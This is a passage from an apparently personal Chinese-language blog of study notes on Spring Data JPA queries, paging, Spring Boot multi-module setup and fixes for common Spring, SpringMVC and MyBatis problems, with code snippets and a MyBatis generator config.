class="params">sort</span>)</span>;</span><br><span class="line"></span><br><span class="line">  @<span class="constructor">Query(<span class="string">"select u.id, LENGTH(u.firstname) as fn_len from User u where u.lastname like ?1%"</span>)</span></span><br><span class="line">  List&lt;Object<span class="literal">[]</span>&gt; find<span class="constructor">ByAsArrayAndSort(String <span class="params">lastname</span>, Sort <span class="params">sort</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">repo.find<span class="constructor">ByAndSort(<span class="string">"lannister"</span>, Sort.<span class="params">by</span>(<span class="string">"firstname"</span>)</span>);                </span><br><span class="line">repo.find<span class="constructor">ByAndSort(<span class="string">"stark"</span>, Sort.<span class="params">by</span>(<span class="string">"LENGTH(firstname)"</span>)</span>);            </span><br><span class="line">repo.find<span class="constructor">ByAndSort(<span class="string">"targaryen"</span>, JpaSort.<span class="params">unsafe</span>(<span class="string">"LENGTH(firstname)"</span>)</span>); </span><br><span class="line">repo.find<span class="constructor">ByAsArrayAndSort(<span class="string">"bolton"</span>, Sort.<span class="params">by</span>(<span class="string">"fn_len"</span>)</span>);</span><br></pre></td></tr></table></figure><h6 id="命名参数"><a href="#命名参数" class="headerlink" title="命名参数"></a>命名参数</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public<span class="built_in"> interface </span>UserRepository extends JpaRepository&lt;User, Long&gt; &#123;</span><br><span class="line"></span><br><span class="line">  @Query(<span class="string">"select u from User u where u.firstname = :firstname or u.lastname = :lastname"</span>)</span><br><span class="line"> <span class="built_in"> User </span>findByLastnameOrFirstname(@Param(<span class="string">"lastname"</span>) String lastname,</span><br><span class="line">                                 @Param(<span class="string">"firstname"</span>) String firstname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>带参数 </p><p><img src="../images/java_web/image-20210428234407083.png" alt="image-20210428234407083"></p><p>使用 </p><p><img src="../images/java_web/image-20210429000733994.png" alt="image-20210429000733994"></p><p>运行正常</p><h6 id="Spel-表达式"><a href="#Spel-表达式" class="headerlink" title="Spel 表达式"></a>Spel 表达式</h6><p><img src="../images/java_web/image-20210428235629062.png" alt="image-20210428235629062"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Id</span></span><br><span class="line">  <span class="meta">@GeneratedValue</span></span><br><span class="line">  Long id;</span><br><span class="line"></span><br><span class="line">  String lastname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">User</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Query</span>(<span class="string">"select u from #&#123;#entityName&#125; u where u.lastname = ?1"</span>)</span><br><span class="line">  <span class="function">List&lt;User&gt; <span class="title">findByLastname</span><span class="params">(String lastname)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/java_web/image-20210428235834668.png" alt="image-20210428235834668"></p><h6 id="修改查询"><a href="#修改查询" class="headerlink" title="修改查询"></a>修改查询</h6><p><img src="../images/java_web/image-20210429162358896.png" alt="image-20210429162358896"></p><p>涉及到 update 或者delete, add等会修改数据的时候, </p><p>需要加上@Modifying注解 </p><p>关键字 使用 ,可以在<named-query /> 中使用 </p><table><thead><tr><th align="left">Keyword</th><th align="left">Sample</th><th align="left">JPQL snippet</th></tr></thead><tbody><tr><td align="left"><code>And</code>和</td><td align="left"><code>findByLastnameAndFirstname</code>findByLastnameAndFirstname</td><td align="left"><code>… where x.lastname = ?1 and x.firstname = ?2</code>…其中x.lastname =？1和x.firstname =？2</td></tr><tr><td align="left"><code>Or</code>或者</td><td align="left"><code>findByLastnameOrFirstname</code>findByLastnameOrFirstname</td><td align="left"><code>… where x.lastname = ?1 or x.firstname = ?2</code>…其中x.lastname =？1或x.firstname =？2</td></tr><tr><td align="left"><code>Is,Equals</code>是，等于</td><td align="left"><code>findByFirstname</code>,<code>findByFirstnameIs</code>,<code>findByFirstnameEquals</code>findByFirstname，findByFirstnameIs，findByFirstnameEquals</td><td align="left"><code>… where x.firstname = ?1</code>…其中x.firstname =？1</td></tr><tr><td align="left"><code>Between</code>之间</td><td align="left"><code>findByStartDateBetween</code>findByStartDateBetween</td><td align="left"><code>… where x.startDate between ?1 and ?2</code>…其中x.startDate在？1和？2之间</td></tr><tr><td align="left"><code>LessThan</code>少于</td><td align="left"><code>findByAgeLessThan</code>findByAgeLessThan</td><td align="left"><code>… where x.age &lt; ?1</code>…其中x.age &lt;？1</td></tr><tr><td align="left"><code>LessThanEqual</code>小于等于</td><td align="left"><code>findByAgeLessThanEqual</code>findByAgeLessThanEqual</td><td align="left"><code>… where x.age ⇐ ?1</code>…其中x.age⇐？1</td></tr><tr><td align="left"><code>GreaterThan</code>比…更棒</td><td align="left"><code>findByAgeGreaterThan</code>findByAgeGreaterThan</td><td align="left"><code>… where x.age &gt; ?1</code>…其中x.age&gt;？1</td></tr><tr><td align="left"><code>GreaterThanEqual</code>大于等于</td><td align="left"><code>findByAgeGreaterThanEqual</code>findByAgeGreaterThanEqual</td><td align="left"><code>… where x.age &gt;= ?1</code>…其中x.age&gt; =？1</td></tr><tr><td align="left"><code>After</code>后</td><td align="left"><code>findByStartDateAfter</code>findByStartDateAfter</td><td align="left"><code>… where x.startDate &gt; ?1</code>…其中x.startDate&gt;？1</td></tr><tr><td align="left"><code>Before</code>前</td><td align="left"><code>findByStartDateBefore</code>findByStartDateBefore</td><td align="left"><code>… where x.startDate &lt; ?1</code>…其中x.startDate &lt;？1</td></tr><tr><td align="left"><code>IsNull</code>一片空白</td><td align="left"><code>findByAgeIsNull</code>findByAgeIsNull</td><td align="left"><code>… where x.age is null</code>…其中x.age为空</td></tr><tr><td align="left"><code>IsNotNull,NotNull</code>IsNotNull，NotNull</td><td align="left"><code>findByAge(Is)NotNull</code>findByAge（Is）NotNull</td><td align="left"><code>… where x.age not null</code>…其中x.age不为null</td></tr><tr><td align="left"><code>Like</code>喜欢</td><td align="left"><code>findByFirstnameLike</code>findByFirstnameLike</td><td align="left"><code>… where x.firstname like ?1</code>…其中x.firstname像？1</td></tr><tr><td align="left"><code>NotLike</code>不喜欢</td><td align="left"><code>findByFirstnameNotLike</code>findByFirstnameNotLike</td><td align="left"><code>… where x.firstname not like ?1</code>…其中x.firstname不喜欢？1</td></tr><tr><td align="left"><code>StartingWith</code>从…开始</td><td align="left"><code>findByFirstnameStartingWith</code>findByFirstnameStartingWith</td><td align="left"><code>… where x.firstname like ?1</code> (parameter bound with appended <code>%</code>)…其中x.firstname如？1（参数与附加的％绑定）</td></tr><tr><td align="left"><code>EndingWith</code>结尾于</td><td align="left"><code>findByFirstnameEndingWith</code>findByFirstnameEndingWith</td><td align="left"><code>… where x.firstname like ?1</code> (parameter bound with prepended <code>%</code>)…其中x.firstname如？1（参数与前缀％绑定）</td></tr><tr><td align="left"><code>Containing</code>内含</td><td align="left"><code>findByFirstnameContaining</code>findByFirstnameContaining</td><td align="left"><code>… where x.firstname like ?1</code> (parameter bound wrapped in <code>%</code>)…其中x.firstname像？1（参数绑定用％包裹）</td></tr><tr><td align="left"><code>OrderBy</code>按订单</td><td align="left"><code>findByAgeOrderByLastnameDesc</code>findByAgeOrderByLastnameDesc</td><td align="left"><code>… where x.age = ?1 order by x.lastname desc</code>…其中x.age =？1，由x.lastname desc排序</td></tr><tr><td align="left"><code>Not</code>不是</td><td align="left"><code>findByLastnameNot</code>findByLastnameNot</td><td align="left"><code>… where x.lastname &lt;&gt; ?1</code>…其中x.lastname &lt;&gt;？1</td></tr><tr><td align="left"><code>In</code>在</td><td align="left"><code>findByAgeIn(Collection&lt;Age&gt; ages)</code>findByAgeIn（Collection <Age>年龄）</td><td align="left"><code>… where x.age in ?1</code>…其中x.age在？1中</td></tr><tr><td align="left"><code>NotIn</code>不在</td><td align="left"><code>findByAgeNotIn(Collection&lt;Age&gt; age)</code>findByAgeNotIn（Collection <Age> age）</td><td align="left"><code>… where x.age not in ?1</code>…其中x.age不在？1中</td></tr><tr><td align="left"><code>True</code>真的</td><td align="left"><code>findByActiveTrue()</code>findByActiveTrue（）</td><td align="left"><code>… where x.active = true</code>…其中x.active = true</td></tr><tr><td align="left"><code>False</code>错误的</td><td align="left"><code>findByActiveFalse()</code>findByActiveFalse（）</td><td align="left"><code>… where x.active = false</code>…其中x.active = false</td></tr><tr><td align="left"><code>IgnoreCase</code>忽略大小写</td><td align="left"><code>findByFirstnameIgnoreCase</code>findByFirstnameIgnoreCase</td><td align="left"><code>… where UPPER(x.firstame) = UPPER(?1)</code>…其中UPPER（x.firstame）= UPPER（？1）</td></tr></tbody></table><p><img src="../images/java_web/image-20210428231134633.png" alt="image-20210428231134633"></p><p>或者</p><p><img src="../images/java_web/image-20210428231246524.png" alt="image-20210428231246524"></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@Entity</span></span><br><span class="line"><span class="variable">@NamedQuery</span>(name = <span class="string">"User.findByEmailAddress"</span>,</span><br><span class="line">  query = <span class="string">"select u from User u where u.emailAddress = ?1"</span>)</span><br><span class="line">public class User &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用时需要声明 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">User</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function">List&lt;User&gt; <span class="title">findByLastname</span><span class="params">(String lastname)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">User <span class="title">findByEmailAddress</span><span class="params">(String emailAddress)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/java_web/image-20210428232412226.png" alt="image-20210428232412226"></p><h6 id="使用原生-sql"><a href="#使用原生-sql" class="headerlink" title="使用原生 sql"></a>使用原生 sql</h6><p>在spring中 为  native count queries  本机查询 </p><p>在@Query中 加上 nativeQuery  = true </p><p><img src="../images/java_web/image-20210429000547981.png" alt="image-20210429000547981"></p><p><img src="../images/java_web/image-20210429000628954.png" alt="image-20210429000628954"></p><h5 id="querydsl"><a href="#querydsl" class="headerlink" title="querydsl"></a>querydsl</h5><p><a href="https://github.com/querydsl/querydsl" target="_blank" rel="noopener">外接框架</a></p><h4 id="分页和排序"><a href="#分页和排序" class="headerlink" title="分页和排序"></a>分页和排序</h4><p>需要用到 spring data 中的 Page 接口 +和 Pageable 分页实现类  </p><p>也可以使用其它类型 </p><p><img src="../images/java_web/image-20210429165407881.png" alt="image-20210429165407881"></p><p>Pageable 使用时 需要传入页数, 每页条数和 排序规则 </p><p><img src="../images/java_web/image-20210429170208344.png" alt="image-20210429170208344"></p><h5 id="Query中使用-Pageable-参数进行分页"><a href="#Query中使用-Pageable-参数进行分页" class="headerlink" title="@Query中使用 Pageable 参数进行分页"></a>@Query中使用 Pageable 参数进行分页</h5><p><img src="../images/java_web/image-20210501163347938.png" alt="image-20210501163347938"></p><p>使用本地查询需要 加上coutQuerty , nativeQuery= true;</p><h4 id="连接-mysql"><a href="#连接-mysql" class="headerlink" title="连接 mysql"></a>连接 mysql</h4><p>将datasource 的url和driver 设置为mysql</p><p><img src="../images/java_web/image-20210425161812697.png" alt="image-20210425161812697"></p><h4 id="整合Mybatis"><a href="#整合Mybatis" class="headerlink" title="整合Mybatis"></a>整合Mybatis</h4><h3 id="boot-多moudle"><a href="#boot-多moudle" class="headerlink" title="boot 多moudle"></a>boot 多moudle</h3><p>作为父moudle 的 将出现<img src="../images/java_web/image-20210429193509970.png" alt="image-20210429193509970"></p><p> 作为父moudle的作用为提供pom 文件将多个moudle 中的 依赖集中管理 , packing 方式为 pom </p><p>所以不能去运行, 所以要将需要运行的不同层次的代码放到各个对应层次的子 moudle中, </p><p>且每个moudle 只能有一个application 主类 ,否则在 install 时会爆 <img src="../images/java_web/image-20210429193607814.png" alt="image-20210429193607814"></p><p>父moudle </p><p><img src="../images/java_web/image-20210429215310843.png" alt="image-20210429215310843"></p><p>子moudle </p><p><img src="../images/java_web/image-20210429215239024.png" alt="image-20210429215239024"></p><h4 id="跨域-1"><a href="#跨域-1" class="headerlink" title="跨域"></a>跨域</h4><h3 id="springCloud"><a href="#springCloud" class="headerlink" title="springCloud"></a>springCloud</h3><p>由于springboot 新版本 2020.x.x的发布,所以把netflix 的一些东西给删减了 , 所以 一些东西不匹配</p><p>构建框架时 先把springSecurity关闭,  如果yml文件中不行或者没卵用那就properties文件中再加一遍</p><h3 id="单点登陆"><a href="#单点登陆" class="headerlink" title="单点登陆"></a>单点登陆</h3><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><h3 id="bean对象创建和加载顺序"><a href="#bean对象创建和加载顺序" class="headerlink" title="bean对象创建和加载顺序"></a>bean对象创建和加载顺序</h3><p>在实践bean中属性时，为了方便，将bean id更改，属性更改，类名不更改的情况，直接在同一个java文件内实现通过不同的bean id 获得有着不同属性的对象，并输出结果进行比较学习。发现后来通过getBean方法创建的bean对象反而先执行实现</p><p>通过更改参数，发现未定义参数返回空值的bean对象调用方法要提前执行  </p><p><img src="../images/java_web/image-20210404002003162.png" alt="image-20210404002003162"></p><p><img src="../images/java_web/image-20210404002008518.png" alt="image-20210404002008518"></p><p>上面为scope属性的单例范围实现</p><p>下面为原型范围实现</p><p>经过检验后发现 bean 中的scope属性颠倒 ，且重复调用了objSingle对象，重复为止在objPrototype.setMessage(“I’m a objProtype firt one”)；下</p><p>说明正常来说bean对象执行过程按照创建顺序执行 ，<code>写代码要更加细心</code></p><p>学习新的知识点，关于Spring容器加载和实例化bean的顺序</p><h4 id="关于Spring容器加载和实例化bean的顺序"><a href="#关于Spring容器加载和实例化bean的顺序" class="headerlink" title="关于Spring容器加载和实例化bean的顺序"></a>关于Spring容器加载和实例化bean的顺序</h4><p><a href="https://my.oschina.net/u/3387320/blog/2995935" target="_blank" rel="noopener">参考</a></p><p>Spring容器在实例化时会加载容器内所有非延迟加载的单例类型Bean。</p><p>ApplicationContext内置一个BeanFactory对象，作为实际的Bean工厂，和Bean相关业务都交给BeanFactory去处理。BeanFactory在加载一个BeanDefinition（也就是加载Bean Class）时，将相应的beanName存入beanDefinitionNames属性中，beanDefinitionName 属性是Spring在加载Bean Class生成的BeanDefinition时，为这些Bean预先定义好的名称，在加载完所有的BeanDefinition后，执行Bean实例化工作在BeanFactory实例化所有非延迟加载的单例Bean时，遍历beanDefinitionNames 集合，按顺序实例化指定名称的Bean，此时会依据beanDefinitionNames的顺序来有序实例化Bean，也就是说Spring容器内Bean的加载和实例化是有顺序的，而且近似一致，当然仅是近似。</p><p>加载bean过程</p><p>先看加载Bean Class过程，零配置下Spring Bean的加载起始于ConfigurationClassPostProcessor类的postProcessBeanDefinitionRegistry（BeanDefinitionRegistry）方法，<br>其加载解析Bean Class的流程如下：</p><p><img src="../images/java_web/9147bdc75798c2deb3f87d6c968142290e7.jpg" alt="img"></p><p>配置类</p><ol><li>Spring容器起始配置类</li><li>@ComponentScan扫描得到的类</li><li>@Import引入的类</li></ol><p>如果类上含有@Configuration， @Component ，@ComponentScan , @Import , @ImportResource注解中的一个，或者内部含有@Bean标识的方法，那么这个类就是一个配置类，Spring就会按照一定流畅去解析这个类上的信息，在解析的第一步会验证当前类是否已经被解析过了，如果是，那么按照一定规则处理(ComponeneScan得到的Bean能覆盖@Import得到的Bean，@Bean定义的优先级最高)</p><p>如果未解析过，那么开始解析：</p><p>1.解析内部类，查看内部类是否应该被定义成一个Bean，如果是，递归解析。<br>        2.解析@PropertySource，也就是解析被引入的Properties文件。<br>        3.解析配置类上是否有@ComponentScan注解，如果有则执行扫描动作，通过扫描得到的Bean Class会被立    即解析成BeanDefinition，添加进beanDefinitionNames属性中。之后查看扫描到的Bean Class是否是一个配置类（大部分情况是，因为标识@Component注解），如果是则递归解析这个Bean Class。<br>        4.解析@Import引入的类，如果这个类是一个配置类，则递归解析。<br>        5.解析@Bean标识的方法，此种形式定义的Bean Class不会被递归解析<br>        6.解析父类上的@ComponentScan，@Import，@Bean，父类不会被再次实例化，因为其子类能够做父类的工作，不需要额外的Bean了。</p><h3 id="Spring和SpringMVC扫描注解类冲突"><a href="#Spring和SpringMVC扫描注解类冲突" class="headerlink" title="Spring和SpringMVC扫描注解类冲突"></a>Spring和SpringMVC扫描注解类冲突</h3><p>因为在已经配置好了一个Beans.xml文件的项目工程下学习Spring的用法, 一直没有出现问题</p><p>所以在学习SpringMVC的时候直接在WEB-INF下创建springmvc-servlet.xml扫描注解类 </p><p>在 404报错页面中一直挣扎,包括修改tomcat配置和实验以前留下的servlet文件用来实验tomcat容器下的文件是否能正常配置</p><p>在最基础的一个mvc项目(输出hello SpringMVC)报错挣扎两三个小时</p><p>一直查找springMVC 404 进而修改 serlvlet.xml扫描注解文件</p><p>终于想到是不是因为存在两个Spring 类的xml文件而引起冲突  ,查找到@Controller 失效. 出现404错误</p><p>,因为WEB-INF文件夹下的jsp文件本来就不能在浏览器上直接访问(在解决上述404页面时学习到的新知识)     webapp目录下有着自动配置好的安全 配置  </p><p>最终解决,因为 创建的maven-web项目都添加了使得maven不自动加载maven插件,使得maven项目中不存在web 目录,需要手动创建, 后来重新建立 maven项目,并 加入maven-web moudle,出现webapp文件夹</p><p>并在此配置springmvc-servlet.xml文件  idea可以识别到此配置文件, 出现spring的标识符</p><p><img src="../images/java_web/image-20210406142508684.png" alt="image-20210406142508684"></p><p>同时 配置的 base-package 下的@Contoller 文件 会对应的有着spring的符号 </p><p><img src="../images/java_web/image-20210406142935810.png" alt="image-20210406142935810"></p><p><img src="../images/java_web/image-20210406142919387.png" alt="image-20210406142919387"></p><p>成功呢</p><h4 id="附上一些配置文件"><a href="#附上一些配置文件" class="headerlink" title="附上一些配置文件"></a>附上一些配置文件</h4><p> <img src="../images/java_web/image-20210406144724593.png" alt="image-20210406144724593"></p><p>Moudules中 Spring 中 Springmvc Servlet 为 springmvc-servlet.xml 文件的 配置名称</p><p>mvc 的配置文件 为  name-servlet .xml 形式 </p><p>文件结构</p><p><img src="../images/java_web/image-20210406145207661.png" alt="image-20210406145207661"></p><p>java 文件夹  和 webapp应该在同一分级</p><h3 id="springMVC中JSP页面EL表达式不起作用"><a href="#springMVC中JSP页面EL表达式不起作用" class="headerlink" title="springMVC中JSP页面EL表达式不起作用"></a>springMVC中JSP页面EL表达式不起作用</h3><p>${}</p><p>在使用 el 表达式的jsp中配置 </p><p>&lt;%@page isELIgonored=”false” %&gt;</p><p>该设置表达式在jsp中使用el表达式,可以解析其中的值, 若isELIgnored 设置为true , 代表在本页不使用el表达式, 当作字符串解析出来显示.  为flase时,el表达式正常工作, 显示正常 </p><p><code>isLIgnored  默认值为true! 所以才会出现这个问题</code></p><h3 id="使用-Insert-注解时-数据没有插入数据库-但得到自增id"><a href="#使用-Insert-注解时-数据没有插入数据库-但得到自增id" class="headerlink" title="使用@Insert 注解时, 数据没有插入数据库,但得到自增id"></a>使用@Insert 注解时, 数据没有插入数据库,但得到自增id</h3><p><img src="../images/java_web/image-20210412225000488.png" alt="image-20210412225000488"></p><p><img src="../images/java_web/image-20210412225005593.png" alt="image-20210412225005593"></p><p>进行查询和数据库中表单更新 ,没有出现新添加数据 ,也没有id</p><h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>需要使用commit()函数手动提交事物</p><p><img src="../images/java_web/image-20210413123221058.png" alt="image-20210413123221058"></p><p><img src="../images/java_web/image-20210413123230890.png" alt="image-20210413123230890"></p><h3 id="对Mybatis中接口方法的返回值进行处理"><a href="#对Mybatis中接口方法的返回值进行处理" class="headerlink" title="对Mybatis中接口方法的返回值进行处理"></a>对Mybatis中接口方法的返回值进行处理</h3><p>对通过id获得数据库中数据的方法进行特定处理, 想实现数据存储进list </p><p>和 调用getAll 方法获得的返回值类型不同, 不能直接使用 list.add()  ,  查找原因后 </p><p> <img src="../images/java_web/image-20210413173041564.png" alt="image-20210413173041564"></p><p>接口内的方法类型决定了方法体的返回值类型, 需要用对应的类型参数取接收</p><h3 id="mvc中写-mybatis-接口实现类调用方法出现异常问题"><a href="#mvc中写-mybatis-接口实现类调用方法出现异常问题" class="headerlink" title="mvc中写 mybatis 接口实现类调用方法出现异常问题"></a>mvc中写 mybatis 接口实现类调用方法出现异常问题</h3><p><img src="../images/java_web/image-20210413220755641.png" alt="image-20210413220755641"></p><p>上面程序正确 , 但服务器日志会出现500报错时,  找了很久报错没解决, 最后调整到mybaits 中mapper别名后出现 mysql-connector驱动找不到, mysql-connector为我自己添加的lib,没有经过pom, 所以tomcat服务器不识别, 将mysql-connector 依赖在pom中重新添加, 正确运行</p><p><img src="../images/java_web/image-20210413221036462.png" alt="image-20210413221036462"></p><h3 id="could-not-autowrite"><a href="#could-not-autowrite" class="headerlink" title="could  not autowrite"></a>could  not autowrite</h3><p>Could not autowire. No beans of ‘AreaDao’ type found   </p><p>对接口 无法用@Autowired 去自动创建bean, 是spring的一个idea插件找实现类的问题, idea以为找不到实现类给出的提示 </p><p>修改error为warnig </p><h3 id="jsp中c-forEach-标签不输出-list-数据"><a href="#jsp中c-forEach-标签不输出-list-数据" class="headerlink" title="jsp中c:forEach 标签不输出 list 数据"></a>jsp中c:forEach 标签不输出 list<object> 数据</h3><p>没添加jstl 依赖 </p><p><img src="../images/java_web/image-20210415004400915.png" alt="image-20210415004400915"></p><p><img src="../images/java_web/image-20210415004408538.png" alt="image-20210415004408538"></p><p>添加后并且要在 jsp页面上加入</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span> %&gt;</span><br></pre></td></tr></table></figure><h3 id="遇到属性不可写问题"><a href="#遇到属性不可写问题" class="headerlink" title="遇到属性不可写问题"></a>遇到属性不可写问题</h3><p><img src="../images/java_web/image-20210415144118740.png" alt="image-20210415144118740"></p><p>jsp页面中使用到了pageNow作为当前页数的记载  ,  在调用如下操作时候发生 page.PageNow属性不可写错误 </p><p><img src="../images/java_web/image-20210415144147666.png" alt="image-20210415144147666"></p><p>将 setPageNow 方法中 Page改为void , 如下 </p><p><img src="../images/java_web/image-20210415144254998.png" alt="image-20210415144254998"></p><p>这样便可写, 因为设置时候 使用的Page对象进行 数据写入 </p><h3 id="文件-上传临时路径无效"><a href="#文件-上传临时路径无效" class="headerlink" title="文件 上传临时路径无效"></a>文件 上传临时路径无效</h3><p>用的是在dispatcher中配置 mult 存放临时路径的文件上传实现类</p><p>更改存放路径 , 放在idea临时路径的根目录下, </p><h3 id="autowired-使用"><a href="#autowired-使用" class="headerlink" title="@autowired 使用"></a>@autowired 使用</h3><p>@autowired使用的类 必须要被spring组件扫描到 </p><p>spring中 添加 @mapperScan 扫描 @ComponentScan 扫描包</p><h3 id="Invalid-bound-statement"><a href="#Invalid-bound-statement" class="headerlink" title="Invalid bound statement"></a>Invalid bound statement</h3><p>跟着练手程序写的时候 没有注意到是写在springboot .yml文件中的 </p><p>用了.yml文件的配置格式导致程序运行找不到 mapper 的 xml文件, 所以就有了 Invalid bound statement</p><h3 id="jpa和mybatis-的区别和使用"><a href="#jpa和mybatis-的区别和使用" class="headerlink" title="jpa和mybatis 的区别和使用"></a>jpa和mybatis 的区别和使用</h3><p>在逼乎上翻了评论 ,众口不一, 最终得出的结论 </p><p>翻找 官方文档, 在官方和 框架底层内去寻找自己想实现的功能, </p><p>在自动化上, mybatis 有mybatis-plus generator 自动实现mapper 接口和mapper xml 文件的创建和配置 </p><p>mapper xml 中 <img src="../images/java_web/image-20210428215520376.png" alt="image-20210428215520376"> </p><p>没有sql’ 语句</p><p>需要配置generatorConfig.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">"MysqlContext"</span> <span class="attr">targetRuntime</span>=<span class="string">"MyBatis3Simple"</span> <span class="attr">defaultModelType</span>=<span class="string">"flat"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"beginningDelimiter"</span> <span class="attr">value</span>=<span class="string">"`"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"endingDelimter"</span> <span class="attr">value</span>=<span class="string">"`"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"javaFileEncoding"</span> <span class="attr">value</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ??????Mapper ??????? ,??true??, ????????????--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"useMapperCommentGenerator"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">type</span>=<span class="string">"tk.mybatis.mapper.generator.MapperPlugin"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--??????Mapper???????????? --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mappers"</span> <span class="attr">value</span>=<span class="string">"tk.mybatis.mapper.common.MySqlMapper"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">type</span>=<span class="string">"tk.mybatis.mapper.generator.MapperPlugin"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--??????Mapper???????????? --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mappers"</span> <span class="attr">value</span>=<span class="string">"tk.mybatis.mapper.common.Mapper"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"caseSensitive"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">"com.mysql.cj.jdbc.Driver"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">"jdbc:mysql://127.0.0.1:3306/library?charcterEncoding=utf-8<span class="symbol">&amp;amp;</span>serverTimezone=GMT%2B8<span class="symbol">&amp;amp;</span>nullCatalogMeansCurrent=true"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">"root"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ??pojo???--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">"com.example.springboot.pojo"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/java"</span>&gt;</span><span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- ???mapper????--&gt;</span></span><br><span class="line">        <span 